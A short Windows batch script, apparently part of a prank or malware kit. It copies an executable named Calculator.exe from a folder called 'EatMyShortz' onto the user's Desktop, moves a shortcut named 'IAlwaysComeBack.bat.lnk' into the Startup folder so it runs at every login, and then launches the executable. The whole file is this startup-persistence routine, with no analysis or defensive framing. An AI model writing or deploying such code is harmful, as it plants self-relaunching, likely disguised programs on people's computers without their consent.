@echo off

if not exist "%homepath%\Desktop\Calculator.exe" (
	copy "C:\Users\%username%\EatMyShortz\Calculator.exe" "%homepath%\Desktop\Calculator.exe"
)

if exist "C:\Users\%username%\EatMyShortz\IAlwaysComeBack.bat.lnk" (
	move "C:\Users\%username%\EatMyShortz\IAlwaysComeBack.bat.lnk" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
)

cd "..\Desktop\"
timeout 1
start Calculator.exe
exit
